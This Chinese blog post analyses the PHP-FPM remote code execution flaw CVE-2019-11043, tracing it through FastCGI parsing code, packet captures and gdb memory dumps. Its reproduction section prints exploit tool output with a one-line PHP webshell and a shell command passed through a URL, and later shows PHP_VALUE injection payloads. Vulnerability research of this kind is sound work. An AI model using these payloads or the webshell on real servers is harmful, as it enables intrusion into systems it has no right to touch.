原创 wywwzjj 合天智汇

## 概述  

安全研究员 Andrew Danau 在解决一道 CTF 题目时发现，向目标服务器 URL 发送 %0a符号时，服务返回异常，疑似存在漏洞。当 Nginx
将包含 PATH_INFO 为空的参数通过 FastCGI 传递给 PHP-FPM 时，PHP-FPM
接收处理的过程中存在逻辑问题。通过精心构造恶意请求可以对 PHP-FPM 进行内存污染，进一步可以复写内存并修改 PHP-FPM 配置，实现远程代码执行。

官方补丁：<https://github.com/php/php-src/commit/ab061f95ca966731b1c84cf5b7b20155c0a1c06a#diff-624bdd47ab6847d777e15327976a9227>

影响版本

PHP 7.1 版本小于 7.1.33

PHP 7.2 版本小于 7.2.24

PHP 7.3 版本小于 7.3.11

## 环境搭建  

只想复现的直接用 p 师傅的 vulhub 启一下 docker，也可以 docker 里装 gdb 调。

文档链接：<https://vulhub.org/#/environments/php/CVE-2019-11043/>

### 编译 PHP  

非必要扩展就不装了。make 之后，二进制文件在 sapi/fpm 下面。

wget https://www.php.net/distributions/php-7.2.23.tar.gz tar -xvf
php-7.2.23.tar.gz && cd php-7.2.23 ./configure --enable-debug --enable-fpm
make

### 配置 fpm  

进程管理方式 pm 选 static，并且 worker 进程设为 1，只产生一个进程便于追踪。日志就直接输出到屏幕。

[global] error_log = /proc/self/fd/2 daemonize = no [www] access.log =
/proc/self/fd/2 clear_env = no listen = 127.0.0.1:9000 pm = static
pm.max_children = 1 pm.start_servers = 1

### 配置 nginx  

server { listen 80 default_server; server_name _; root /var/www/html; location
/ { index index.php index.html index.htm; } location ~ [^/]\\.php(/|$) {
fastcgi_split_path_info ^(.+?\\.php)(/.*)$; include fastcgi_params;
fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
fastcgi_param PATH_INFO $fastcgi_path_info; fastcgi_param PATH_TRANSLATED
$document_root$fastcgi_path_info; fastcgi_pass 127.0.0.1:9000; fastcgi_index
index.php; } error_page 500 502 503 504 /50x.html; location = /50x.html { root
/usr/share/nginx/html; } }

### 启动 fpm  

./php-fpm -c php.ini -y php-fpm.conf

### CLion 调试  

echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope

或者直接 gdb（虽然 CLion 也是用的 gdb）

ps -aux | grep "pool www" | awk 'NR==1{print $2}' | gdb -p

## 复现  

使用 <https://github.com/neex/phuip-fpizdam> 中给出的工具，发送数据包。

➜ fpm-rce go run . http://localhost/index.php 2020/01/23 03:04:17 Base status
code is 200 2020/01/23 03:04:18 Status code 404 for qsl=1850, adding as a
candidate 2020/01/23 03:04:18 The target is probably vulnerable. Possible
QSLs: [1840 1845 1850] 2020/01/23 03:04:18 Attack params found: --qsl 1845
--pisos 43 --skip-detect 2020/01/23 03:04:18 Trying to set
"session.auto_start=0"... 2020/01/23 03:04:18 Detect() returned attack params:
--qsl 1845 --pisos 43 --skip-detect <\-- REMEMBER THIS 2020/01/23 03:04:18
Performing attack using php.ini settings... 2020/01/23 03:04:18 Success! Was
able to execute a command by appending "?a=/bin/sh+-c+'which+which'&" to URLs
2020/01/23 03:04:18 Trying to cleanup /tmp/a... 2020/01/23 03:04:18 Done! ➜
fpm-rce cat /tmp/a <?php echo `$_GET[a]`;return;?>

## FPM 生命周期  

这一部分建议看盘谷大叔的书，以下是部分摘录。

![v2-cb7fa170938558cfe2b7a1c2ad7863d4_hd.j](https://pic3.zhimg.com/80/v2-cb7fa170938558cfe2b7a1c2ad7863d4_hd.jpg)

image.png

fpm_run() 执行后将 fork 出 worker 进程，worker 进程返回 main() 中继续向下执行，后面的流程就是 worker 进程不断
accept 请求，然后执行 PHP 脚本并返回。整体流程如下：

  * (1) 等待请求： worker 进程阻塞在 fcgi_accept_request() 等待请求；  

  * (2) 解析请求： fastcgi 请求到达后被 worker 接收，然后开始接收并解析请求数据，直到 request 数据完全到达；  

  * (3) 请求初始化： 执行 php_request_startup()，此阶段会调用每个扩展的：PHP_RINIT_FUNCTION()；  

  * (4) 编译、执行： 由 php_execute_script() 完成 PHP 脚本的编译、执行；  

  * (5) 关闭请求： 请求完成后执行 php_request_shutdown()，此阶段会调用每个扩展的：PHP_RSHUTDOWN_FUNCTION()，然后进入步骤 (1) 等待下一个请求。  

worker 进程一次请求的处理被划分为 5 个阶段：

  * FPM_REQUEST_ACCEPTING: 等待请求阶段  

  * FPM_REQUEST_READING_HEADERS: 读取 fastcgi 请求 header 阶段  

  * FPM_REQUEST_INFO: 获取请求信息阶段，此阶段是将请求的 method、query stirng、request uri 等信息保存到各 worker 进程的 fpm_scoreboard_proc_s 结构中，此操作需要加锁，因为 master 进程也会操作此结构  

  * FPM_REQUEST_EXECUTING: 执行请求阶段  

  * FPM_REQUEST_END: 没有使用  

  * FPM_REQUEST_FINISHED: 请求处理完成  

worker 处理到各个阶段时将会把当前阶段更新到 fpm_scoreboard_proc_s->request_stage，master
进程正是通过这个标识判断 worker 进程是否空闲的。FPM 进程管理有个记分牌机制。

## FastCGI 协议  

文档：<http://www.mit.edu/>~yandros/doc/specs/fcgi-spec.html

![v2-2420889e3307b2283c9fa8d6fc0fce9b_hd.j](https://pic2.zhimg.com/80/v2-2420889e3307b2283c9fa8d6fc0fce9b_hd.jpg)

image.png

len = (contentLengthB1 << 8) | contentLengthB0 说明一次性最多发 2 ^ 16 = 256k。

### 相关结构体  

typedef struct _fcgi_header { unsigned char version; // 版本 unsigned char type;
// 本次 record 的类型 unsigned char requestIdB1; // 本次 record 对应的请求 id unsigned
char requestIdB0; unsigned char contentLengthB1; // body 的大小 unsigned char
contentLengthB0; unsigned char paddingLength; // 额外块大小 unsigned char reserved;
} fcgi_header; typedef enum _fcgi_request_type { FCGI_BEGIN_REQUEST = 1, /*
[in] */ FCGI_ABORT_REQUEST = 2, /* [in] (not supported) */ FCGI_END_REQUEST =
3, /* [out] */ FCGI_PARAMS = 4, /* [in] environment variables */ FCGI_STDIN =
5, /* [in] post data */ FCGI_STDOUT = 6, /* [out] response */ FCGI_STDERR = 7,
/* [out] errors */ FCGI_DATA = 8, /* [in] filter data (not supported) */
FCGI_GET_VALUES = 9, /* [in] */ FCGI_GET_VALUES_RESULT = 10 /* [out] */ }
fcgi_request_type;

![v2-d5a6495c310b63d10673601cd4f7cae5_hd.j](https://pic3.zhimg.com/80/v2-d5a6495c310b63d10673601cd4f7cae5_hd.jpg)

image.png

![v2-f014a5342a5a641b48b2e8a060b77a72_hd.j](https://pic4.zhimg.com/80/v2-f014a5342a5a641b48b2e8a060b77a72_hd.jpg)

image.png

### 抓包分析  

![v2-433c31517e95d1f53f93642f8c8a3a4d_hd.j](https://pic4.zhimg.com/80/v2-433c31517e95d1f53f93642f8c8a3a4d_hd.jpg)

image.png

以下是向服务器发送 index.php/abc%0aabc时抓的数据包，结合上面几张图就很容易看懂了。

00000000 01 01 00 01 00 08 00 00 00 01 00 00 00 00 00 00 ........ ........
00000010 01 04 00 01 02 48 00 00 0c 00 51 55 45 52 59 5f .....H.. ..QUERY_
00000020 53 54 52 49 4e 47 0e 03 52 45 51 55 45 53 54 5f STRING.. REQUEST_
00000030 4d 45 54 48 4f 44 47 45 54 0c 00 43 4f 4e 54 45 METHODGE T..CONTE
00000040 4e 54 5f 54 59 50 45 0e 00 43 4f 4e 54 45 4e 54 NT_TYPE. .CONTENT
00000050 5f 4c 45 4e 47 54 48 0b 12 53 43 52 49 50 54 5f _LENGTH. .SCRIPT_
00000060 4e 41 4d 45 2f 69 6e 64 65 78 2e 70 68 70 2f 61 NAME/ind ex.php/a
00000070 62 63 0a 61 62 63 0b 14 52 45 51 55 45 53 54 5f bc.abc.. REQUEST_
00000080 55 52 49 2f 69 6e 64 65 78 2e 70 68 70 2f 61 62 URI/inde x.php/ab
00000090 63 25 30 61 61 62 63 0c 12 44 4f 43 55 4d 45 4e c%0aabc. .DOCUMEN
000000A0 54 5f 55 52 49 2f 69 6e 64 65 78 2e 70 68 70 2f T_URI/in dex.php/
000000B0 61 62 63 0a 61 62 63 0d 15 44 4f 43 55 4d 45 4e abc.abc. .DOCUMEN
000000C0 54 5f 52 4f 4f 54 2f 75 73 72 2f 73 68 61 72 65 T_ROOT/u sr/share
000000D0 2f 6e 67 69 6e 78 2f 68 74 6d 6c 0f 08 53 45 52 /nginx/h tml..SER
000000E0 56 45 52 5f 50 52 4f 54 4f 43 4f 4c 48 54 54 50 VER_PROT OCOLHTTP
000000F0 2f 31 2e 31 0e 04 52 45 51 55 45 53 54 5f 53 43 /1.1..RE QUEST_SC
00000100 48 45 4d 45 68 74 74 70 11 07 47 41 54 45 57 41 HEMEhttp ..GATEWA
00000110 59 5f 49 4e 54 45 52 46 41 43 45 43 47 49 2f 31 Y_INTERF ACECGI/1
00000120 2e 31 0f 0c 53 45 52 56 45 52 5f 53 4f 46 54 57 .1..SERV ER_SOFTW
00000130 41 52 45 6e 67 69 6e 78 2f 31 2e 31 37 2e 38 0b AREnginx /1.17.8.
00000140 0a 52 45 4d 4f 54 45 5f 41 44 44 52 31 37 32 2e .REMOTE_ ADDR172.
00000150 32 35 2e 30 2e 31 0b 05 52 45 4d 4f 54 45 5f 50 25.0.1.. REMOTE_P
00000160 4f 52 54 35 36 38 33 34 0b 0a 53 45 52 56 45 52 ORT56834 ..SERVER
00000170 5f 41 44 44 52 31 37 32 2e 32 35 2e 30 2e 33 0b _ADDR172 .25.0.3.
00000180 02 53 45 52 56 45 52 5f 50 4f 52 54 38 30 0b 01 .SERVER_ PORT80..
00000190 53 45 52 56 45 52 5f 4e 41 4d 45 5f 0f 03 52 45 SERVER_N AME_..RE
000001A0 44 49 52 45 43 54 5f 53 54 41 54 55 53 32 30 30 DIRECT_S TATUS200
000001B0 09 00 50 41 54 48 5f 49 4e 46 4f 0f 03 52 45 44 ..PATH_I NFO..RED
000001C0 49 52 45 43 54 5f 53 54 41 54 55 53 32 30 30 0f IRECT_ST ATUS200.
000001D0 1f 53 43 52 49 50 54 5f 46 49 4c 45 4e 41 4d 45 .SCRIPT_ FILENAME
000001E0 2f 76 61 72 2f 77 77 77 2f 68 74 6d 6c 2f 69 6e /var/www /html/in
000001F0 64 65 78 2e 70 68 70 2f 61 62 63 0a 61 62 63 0d dex.php/ abc.abc.
00000200 0d 44 4f 43 55 4d 45 4e 54 5f 52 4f 4f 54 2f 76 .DOCUMEN T_ROOT/v
00000210 61 72 2f 77 77 77 2f 68 74 6d 6c 09 0e 48 54 54 ar/www/h tml..HTT
00000220 50 5f 48 4f 53 54 6c 6f 63 61 6c 68 6f 73 74 3a P_HOSTlo calhost:
00000230 38 30 38 30 0f 0b 48 54 54 50 5f 55 53 45 52 5f 8080..HT TP_USER_
00000240 41 47 45 4e 54 63 75 72 6c 2f 37 2e 35 38 2e 30 AGENTcur l/7.58.0
00000250 0b 03 48 54 54 50 5f 41 43 43 45 50 54 2a 2f 2a ..HTTP_A CCEPT*/*
00000260 01 04 00 01 00 00 00 00 01 05 00 01 00 00 00 00 ........ ........
00000000 01 06 00 01 00 44 04 00 58 2d 50 6f 77 65 72 65 .....D.. X-Powere
00000010 64 2d 42 79 3a 20 50 48 50 2f 37 2e 32 2e 31 30 d-By: PH P/7.2.10
00000020 0d 0a 43 6f 6e 74 65 6e 74 2d 74 79 70 65 3a 20 ..Conten t-type:
00000030 74 65 78 74 2f 68 74 6d 6c 3b 20 63 68 61 72 73 text/htm l; chars
00000040 65 74 3d 55 54 46 2d 38 0d 0a 0d 0a 54 48 5f 49 et=UTF-8 ....TH_I
00000050 4e 46 4f 00 00 00 00 00 01 03 00 01 00 08 00 00 NFO..... ........
00000060 00 00 00 00 00 08 00 00 ........

### FPM 如何将参数提取出来？  

结合 FPM 生命周期，解析 FastCGI 协议字段是在 FPM_REQUEST_READING_HEADERS 阶段。

> 本来想把这些过程画一个函数调用图，太麻烦了。  
>

// fpm_main.c request = fpm_init_request(fcgi_fd); zend_first_try { while
(EXPECTED(fcgi_accept_request(request) >= 0)) { char *primary_script = NULL;
request_body_fd = -1; SG(server_context) = (void *) request;
init_request_info(); fpm_request_info(); // ... } } zend_catch { exit_status =
FPM_EXIT_SOFTWARE; } zend_end_try();

fpm_accept_request 建立连接之后，就是读取数据。

// fastcgi.c int fcgi_accept_request(fcgi_request *req) {
req->hook.on_accept(); // ... req->fd = accept(listen_socket, (struct sockaddr
*)&sa, &len); // ... req->hook.on_read(); fcgi_read_request(req); // ... }

fcgi_read_request 先读 header，获取到 type，再拿到 len，针对类型做不同处理，再继续往下读。

// fastcgi.c static int fcgi_read_request(fcgi_request *req) { // ... if
(safe_read(req, &hdr, sizeof(fcgi_header)) != sizeof(fcgi_header) ||
hdr.version < FCGI_VERSION_1) { return 0; } len = (hdr.contentLengthB1 << 8) |
hdr.contentLengthB0; padding = hdr.paddingLength; while (hdr.type ==
FCGI_PARAMS && len > 0) { if (len + padding > FCGI_MAX_LENGTH) { return 0; }
// safe_read() 是对 read() 的封装 if (safe_read(req, buf, len+padding) !=
len+padding) { req->keep = 0; return 0; } if (!fcgi_get_params(req, buf,
buf+len)) { req->keep = 0; return 0; } if (safe_read(req, &hdr,
sizeof(fcgi_header)) != sizeof(fcgi_header) || hdr.version < FCGI_VERSION_1) {
req->keep = 0; return 0; } len = (hdr.contentLengthB1 << 8) |
hdr.contentLengthB0; padding = hdr.paddingLength; } // ... }

fcgi_get_params 当 hdr.type == FCGI_PARAMS 就开始提取参数，全部存储到 request->env->data。

static int fcgi_get_params(fcgi_request *req, unsigned char *p, unsigned char
*end) { unsigned int name_len, val_len; while (p < end) { name_len = *p++; //
... val_len = *p++; // ... fcgi_hash_set(&req->env, FCGI_HASH_FUNC(p,
name_len), (char*)p, name_len, (char*)p + name_len, val_len); p += name_len +
val_len; } return 1; }

提取实例

提取规则很简单，Nginx 以 keyLength+valueLength+key+value 传过来的，利用 fcgi_hash_set() 存进去。

0x7ffd6e941dde:
"\v\024REQUEST_URI/index.php/abc%0aabc\f\022DOCUMENT_URI/index.php/abc\nabc\r\rDOCUMENT_ROOT/var/www/html\017\bSERVER_PROTOCOLHTTP/1.1\016\004REQUEST_SCHEMEhttp\021\aGATEWAY_INTERFACECGI/1.1\017\fSERVER_SOFTWAREnginx/1.14.0\v\tREMOTE_ADDR127.0.0.1\v\005REMOTE_PORT37248\v\tSERVER_ADDR127.0.0.1\v\002SERVER_PORT80\v\001SERVER_NAME_\017\003REDIRECT_STATUS200\017\037SCRIPT_FILENAME/var/www/html/index.php/abc\nabc\t"
0x7ffd6e941f40:
"PATH_INFO\017\rPATH_TRANSLATED/var/www/html\t\tHTTP_HOSTlocalhost\017\vHTTP_USER_AGENTcurl/7.58.0\v\003HTTP_ACCEPT*/*"

《Fastcgi安全》，复制链接或点击阅读原文做实验。

<http://www.hetianlab.com/expc.do?ec=ECID172.19.104.182015060115422500001>

![v2-a7f6e51f9defd63644049280f82a4f20_hd.j](https://pic1.zhimg.com/80/v2-a7f6e51f9defd63644049280f82a4f20_hd.jpg)

## 分析  

看一下 nginx 文档推荐的 fpm 配置，其中特意判断了一下脚本文件是否存在，注意：能被攻击的是没有这行判断的。

> 配置字段不熟悉的可以看这个 <http://nginx.org/en/docs/http/ngx_http_fastcgi_module.html>  
>

location ~ [^/]\\.php(/|$) { fastcgi_split_path_info ^(.+?\\.php)(/.*)$; if
(!-f $document_root$fastcgi_script_name) { return 404; } fastcgi_pass
127.0.0.1:9000; fastcgi_index index.php; fastcgi_param SCRIPT_FILENAME
$document_root$fastcgi_script_name; fastcgi_param DOCUMENT_ROOT
/var/www/html/; include fastcgi_params; }

### 异常出现  

在 URL 中加入换行符后出现了异常，我设的返回值是 $_SERVER['PATH_INFO']，看这结果应该是出现了溢出。

![v2-ae3ebc0c4a56f79c6a23b4fd145abb41_hd.j](https://pic3.zhimg.com/80/v2-ae3ebc0c4a56f79c6a23b4fd145abb41_hd.jpg)

image.png

根据这个正则 ^(.+?\\.php)(/.*)$，前一部分给了 fastcgi_path_info。

由于没有匹配换行符，FastCGI 拿到的 PATH_INFO 应该是空的。为什么 PHP 依然能获取到呢？

php > preg_match('/^(.+?\\.php)(\/.*)$/', urldecode('index.php/abcabc'),
$matches);print_r($matches); Array ( [0] => index.php/abcabc [1] => index.php
[2] => /abcabc ) php > preg_match('/^(.+?\\.php)(\/.*)$/',
urldecode('index.php/abc%0aabc'), $matches);print_r($matches); Array ( )

为什么 fpm 拿到的 SCRIPT_NAME 为 index.php/abc%0a/123？正则匹配结果诡异，这一点得翻 nginx 源码了。

### 找寻原因  

继续寻找这些问题的答案。上面已经对 FastCGI 做了比较详细的描述，这里直奔主题。

// fpm_main.c request = fpm_init_request(fcgi_fd); zend_first_try { while
(EXPECTED(fcgi_accept_request(request) >= 0)) { char *primary_script = NULL;
request_body_fd = -1; SG(server_context) = (void *) request;
init_request_info(); fpm_request_info(); // ... } } zend_catch { exit_status =
FPM_EXIT_SOFTWARE; } zend_end_try();

定位到 init_request_info()，这里从 Hashtable 中拿出了 SCRIPT_FILENAME。

![v2-fccf4a3e06164c4ccd18a51a5c9c370c_hd.j](https://pic3.zhimg.com/80/v2-fccf4a3e06164c4ccd18a51a5c9c370c_hd.jpg)

image.png

继续往下看，pilen = 0，env_path_info 减了一个正数，所以 path_info 指针将会往低地址移。XD

![v2-6058cba3efbee7e74b8fa1967706ff6f_hd.j](https://pic4.zhimg.com/80/v2-6058cba3efbee7e74b8fa1967706ff6f_hd.jpg)

image.png

为什么会是 TH_INFO 呢？看一下内存，ffe4 - 8 = ffdc，效果就是 path_info 指针往前移了。

![v2-4069a8046d3a321aef9d65eed9294be2_hd.j](https://pic1.zhimg.com/80/v2-4069a8046d3a321aef9d65eed9294be2_hd.jpg)

image.png

注意几个变量值：

char *path_info = env_path_info + pilen - slen;

  * env_path_infochar *env_path_info = FCGI_GETENV(request, "PATH_INFO");Nginx 传过来的 PATH_INFO 为空，所以 env_path_info 指向的是一个空字符串。  

  * pilen空字符串，strlen 自然为 0。  

  * ptlenchar *env_script_name = FCGI_GETENV(request, "SCRIPT_NAME");char *script_path_translated = env_script_filename;char *pt = estrndup(script_path_translated, script_path_translated_len);estrndup() 是 PHP 封装的内存管理函数，即分配一个可存放 NULL 结尾的字符串 s 的缓冲区，并将 s 复制到缓冲区内。还有印象吗？Nginx 把前一部分给了 fastcgi_path_info。image.png这里的长度其实是 script_name + path_info 的长度，但是后面还有处理！if (pt) {while ((ptr = strrchr(pt, '/')) || (ptr = strrchr(pt, '\\\'))) {*ptr = 0;if (stat(pt, &st) == 0 && S_ISREG(st.st_mode)) {ptr 指向的是 pt 中最后一个/ 或者 \开始的字符串，当 *ptr = 0，相当于截断，pt 就只留下前一段。再用 stat() 判断该文件是否存在，这一步的操作就是要提取一个实际存在的 script。所以，最终变成了 script_name 的长度。  

  * slenlen 则是总长度，最初的 env_script_filename 的长度。slen = len - ptlen一减就是被删掉的那一部分的长度，即 path_info 的长度，这里的话就是 /abc\nabc 的长度。  

### 单字节写入  

仅凭一个指针偏移当然无法 RCE，继续往下找找看哪里用到了 path_info。

最有意思的地方来了，单字节写入！开发者这样写的原意是什么？

old = path_info[0]; path_info[0] = 0; // path_info 可控，单字节写入 if
(!orig_script_name || strcmp(orig_script_name, env_path_info) != 0) { if
(orig_script_name) { FCGI_PUTENV(request, "ORIG_SCRIPT_NAME",
orig_script_name); // exploit } // exploit SG(request_info).request_uri =
FCGI_PUTENV(request, "SCRIPT_NAME", env_path_info); } else {
SG(request_info).request_uri = orig_script_name; } path_info[0] = old; // 复原

写个 0 进去有啥用？

![v2-d478701bfb06b884d51bab4ff5262eb5_hd.j](https://pic4.zhimg.com/80/v2-d478701bfb06b884d51bab4ff5262eb5_hd.jpg)

image.png

### FCGI_PUTENV  

在复原 path_info 之前，还有 FCGI_PUTENV，这是一个写操作，nice。

FCGI_PUTENV(request, "SCRIPT_NAME", env_path_info); // 宏定义 #define
FCGI_PUTENV(request, name, value) \ fcgi_quick_putenv(request, name,
sizeof(name)-1, FCGI_HASH_FUNC(name, sizeof(name)-1), value) // 简单做了下
hash，必然会出现一些一样的哈希值 #define FCGI_HASH_FUNC(var, var_len) \ (UNEXPECTED(var_len
< 3) ? (unsigned int)var_len : \ (((unsigned int)var[3]) << 2) + \ (((unsigned
int)var[var_len-2]) << 4) + \ (((unsigned int)var[var_len-1]) << 2) + \
var_len) char* fcgi_quick_putenv(fcgi_request *req, char* var, int var_len,
unsigned int hash_value, char* val) { if (val == NULL) {
fcgi_hash_del(&req->env, hash_value, var, var_len); return NULL; } else {
return fcgi_hash_set(&req->env, hash_value, var, var_len, val, (unsigned
int)strlen(val)); } }

这里梳理一下 FCGI_PUTENV 对 hash_table 的操作。代码注释不足，理解这几个结构体有一定难度，硬看！

> 希望这个图加上下面代码的注释能稍微解释清楚这些操作，其中的链表操作可以先不看，这里用不到。  
>

![v2-f14b603e0d1115704d6885c7888aed95_hd.j](https://pic4.zhimg.com/80/v2-f14b603e0d1115704d6885c7888aed95_hd.jpg)

image.png

// fastcgi.c struct _fcgi_request { int listen_socket; int tcp; int fd; int
id; int keep; #ifdef TCP_NODELAY int nodelay; #endif int ended; int in_len;
int in_pad; fcgi_header *out_hdr; unsigned char *out_pos; unsigned char
out_buf[1024*8]; unsigned char reserved[sizeof(fcgi_end_request_rec)];
fcgi_req_hook hook; // 存着 hook 函数的函数指针，分别是 on_accept(),on_read(),on_close()
int has_env; fcgi_hash env; }; typedef struct _fcgi_hash { fcgi_hash_bucket
*hash_table[FCGI_HASH_TABLE_SIZE]; // 哈希值作为数组索引 fcgi_hash_bucket *list; //
指向当前用到了哪个 hashtable fcgi_hash_buckets *buckets; // 顺序存储的 hashtable
fcgi_data_seg *data; // 所有环境变量都存在这，以 var1val1var2val2 形式 } fcgi_hash; typedef
struct _fcgi_hash_bucket { unsigned int hash_value; // 变量名的哈希值，提高存取效率，最后才比较字符串
unsigned int var_len; char *var; unsigned int val_len; char *val; struct
_fcgi_hash_bucket *next; struct _fcgi_hash_bucket *list_next; // 上一个 bucket }
fcgi_hash_bucket; typedef struct _fcgi_hash_buckets { unsigned int idx; //
当前使用了多少个 hashtable struct _fcgi_hash_buckets *next; // 不够再加 struct
_fcgi_hash_bucket data[FCGI_HASH_TABLE_SIZE]; // 按 fcgi_hash_set 调用顺序存储 }
fcgi_hash_buckets; // 的 hashtable 指针。 typedef struct _fcgi_data_seg { char
*pos; // data[] 中未使用的内存 char *end; // data[] 的结尾地址 struct _fcgi_data_seg
*next; // 如果一个 seg 存不下，再分配一个 char data[1]; // 等效 data[]、data[0] // C
语言“变长数组”写法，所有的环境变量都存在这里。 } fcgi_data_seg; static void fcgi_hash_init(fcgi_hash
*h) { memset(h->hash_table, 0, sizeof(h->hash_table)); h->list = NULL;
h->buckets = (fcgi_hash_buckets*)malloc(sizeof(fcgi_hash_buckets));
h->buckets->idx = 0; h->buckets->next = NULL; /* * 上面的 data[1] 结合这里的 malloc
就能解释清楚了， * 给结构体完分配剩下的全给 data[] 用，即 data 能用 FCGI_HASH_SEG_SIZE（4096） 个字节。 */
h->data = (fcgi_data_seg*)malloc(sizeof(fcgi_data_seg) - 1 +
FCGI_HASH_SEG_SIZE); h->data->pos = h->data->data; h->data->end = h->data->pos
+ FCGI_HASH_SEG_SIZE; h->data->next = NULL; } static char*
fcgi_hash_set(fcgi_hash *h, unsigned int hash_value, char *var, unsigned int
var_len, char *val, unsigned int val_len) { unsigned int idx = hash_value &
FCGI_HASH_TABLE_MASK; // 模一下，防止越界 fcgi_hash_bucket *p = h->hash_table[idx];
while (UNEXPECTED(p != NULL)) { if (UNEXPECTED(p->hash_value == hash_value) &&
p->var_len == var_len && memcmp(p->var, var, var_len) == 0) { p->val_len =
val_len; p->val = fcgi_hash_strndup(h, val, val_len); return p->val; } p =
p->next; } // 不够就加 if (UNEXPECTED(h->buckets->idx >= FCGI_HASH_TABLE_SIZE)) {
fcgi_hash_buckets *b = (fcgi_hash_buckets*)malloc(sizeof(fcgi_hash_buckets));
b->idx = 0; b->next = h->buckets; h->buckets = b; } p = h->buckets->data +
h->buckets->idx; // 拿到具体的 bucket 指针 h->buckets->idx++; // 表示 buckets 内有多少个了
p->next = h->hash_table[idx]; h->hash_table[idx] = p; // 将 bucket 加入
hash_table p->list_next = h->list; h->list = p; p->hash_value = hash_value;
p->var_len = var_len; p->var = fcgi_hash_strndup(h, var, var_len); p->val_len
= val_len; p->val = fcgi_hash_strndup(h, val, val_len); return p->val; }

### 扩大攻击面  

最重要的就是这个了，h->data->pos 始终指向的是结构体中未被使用的内存起始地址。

![v2-def190fd2ce006cd404bc7695b482f10_hd.j](https://pic3.zhimg.com/80/v2-def190fd2ce006cd404bc7695b482f10_hd.jpg)

image.png

static inline char* fcgi_hash_strndup(fcgi_hash *h, char *str, unsigned int
str_len) { char *ret; // 不够就加 if (UNEXPECTED(h->data->pos + str_len + 1 >=
h->data->end)) { unsigned int seg_size = (str_len + 1 > FCGI_HASH_SEG_SIZE) ?
str_len + 1 : FCGI_HASH_SEG_SIZE; fcgi_data_seg *p =
(fcgi_data_seg*)malloc(sizeof(fcgi_data_seg) - 1 + seg_size); p->pos =
p->data; p->end = p->pos + seg_size; p->next = h->data; h->data = p; } ret =
h->data->pos; memcpy(ret, str, str_len); ret[str_len] = 0; h->data->pos +=
str_len + 1; return ret; }

利用这个 memcpy，一旦控制了 h->data->pos 的值，就实现了指定位置多字节写入！

结合下面打印的内存可以看到，这里的偏移并不是定值，而是受多个参数的影响，env_path_info 要怎么移才可能指到 pos 的位置？

能爆破吗？可以，但每次都爆就很麻烦。

(gdb) x/1xg &h->data->pos 0x56457251ce00: 0x000056457251d02f // 此时将最低位置0 =>
0x000056457251d000 (gdb) x/60s request->env->data 0x56457251ce00:
"\037\320QrEV" <\------------ &h->data->pos 0x56457251ce07: "" 0x56457251ce08:
"\030\336QrEV" 0x56457251ce0f: "" 0x56457251ce10: "" 0x56457251ce11: ""
0x56457251ce12: "" 0x56457251ce13: "" 0x56457251ce14: "" 0x56457251ce15: ""
0x56457251ce16: "" 0x56457251ce17: "" 0x56457251ce18: "FCGI_ROLE"
0x56457251ce22: "RESPONDER" 0x56457251ce2c: "QUERY_STRING" 0x56457251ce39: ""
0x56457251ce3a: "REQUEST_METHOD" 0x56457251ce49: "GET" 0x56457251ce4d:
"CONTENT_TYPE" 0x56457251ce5a: "" 0x56457251ce5b: "CONTENT_LENGTH"
0x56457251ce6a: "" 0x56457251ce6b: "SCRIPT_NAME" 0x56457251ce77:
"/index.php/PHP_VALUE\nsession.auto_start=1" 0x56457251cea1: "REQUEST_URI"
0x56457251cead: "/index.php/PHP_VALUE%0Asession.auto_start=1" 0x56457251ced9:
"DOCUMENT_URI" 0x56457251cee6: "/index.php/PHP_VALUE\nsession.auto_start=1"
0x56457251cf10: "DOCUMENT_ROOT" 0x56457251cf1e: "/var/www/html"
0x56457251cf2c: "SERVER_PROTOCOL" 0x56457251cf3c: "HTTP/1.1" 0x56457251cf45:
"REQUEST_SCHEME" 0x56457251cf54: "http" 0x56457251cf59: "SCRIPT_FILENAME"
0x56457251cf69: "/var/www/html/index.php/PHP_VALUE\nsession.auto_start=1"
0x56457251cfa0: "PATH_INFO" 0x56457251cfaa: "" <\------------ env_path_info
0x56457251cfab: "PATH_TRANSLATED" 0x56457251cfbb: "/var/www/html"
0x56457251cfc9: "HTTP_HOST" 0x56457251cfd3: "localhost" 0x56457251cfdd:
"HTTP_USER_AGENT" 0x56457251cfed: "curl/7.58.0" 0x56457251cff9: "HTTP_ACCEPT"
0x56457251d005: "*/*" <\------------ (&h->data->pos)[0] = 0 0x56457251d009:
"HTTP_EBUT" 0x56457251d013: "mamku tvoyu" 0x56457251d01f: "ORIG_PATH_INFO"
0x56457251d02e: "" 0x56457251d02f: "" <\------------ h->data->pos

还有个问题，可控点是 orig_script_name 即 script_name，一旦我们需要更改这个值，env_path_info 到 pos
的偏移又会发生变化，又需要重新爆破？

  * 第一种办法两者之间，/index.php/PHP_VALUE\nsession.auto_start=1 出现了四次，完全可以重新计算出偏移。  

  * 第二种办法如果两者之间没有其他变量的存储了，那这个偏移一定是个定值，换句话来说，如果 path_info 是第一个写入的。恰好是这样的内存分布：typedef struct _fcgi_data_seg {char *pos; // 8个字节char *end; // 8个字节struct _fcgi_data_seg *next; // 8个字节，指向前一个 fcgi_data_seg------------- // char data[1];PATH_INFO\x00------------- // 10个字节\x00 <\---- env_path_info} fcgi_data_seg;从作者给的 PoC 中可以看到，他是疯狂填充 ，当写入 path_info 时恰好使一个 fcgi_data_seg 不够用，再 malloc 一个，这使 path_info 自然而然的成为了新 fcgi_data_seg 中第一个写入的。怎么知道正好 malloc 呢？还是利用那个 memcpy，对一个非法地址写入时会 crash，返回 502。稍微解释一下这个 crash，结合上面的内存分布，当偏移 34 字节时，path_info[0] = 0，就修改了 pos 的最低位的地址。如果少偏一点，比如 30 字节，那将把第五个字节置 0，这样指向的内存一般不能瞎写了。(gdb) x/1xg &h->data->pos0x56457251ce00: 0x000056457251d02f // 34 => 0x000056457251d0000x56457251ce00: 0x000056457251d02f // 30 => 0x000056400251d02f  

### RCE  

到这里，单字节写入提升为多字节指定写入了，写点什么好呢？继续。

注意到这有个解析 PHP_VALUE 的过程，那么 RCE 快来了。XD

// fpm_main.c 1398 /* INI stuff */ ini = FCGI_GETENV(request, "PHP_VALUE"); if
(ini) { int mode = ZEND_INI_USER; char *tmp; spprintf(&tmp, 0, "%s\n", ini);
zend_parse_ini_string(tmp, 1, ZEND_INI_SCANNER_NORMAL,
(zend_ini_parser_cb_t)fastcgi_ini_parser, &mode); efree(tmp); }

跟一下这个宏。

#define FCGI_GETENV(request, name) \ fcgi_quick_getenv(request, name,
sizeof(name)-1, FCGI_HASH_FUNC(name, sizeof(name)-1)) char*
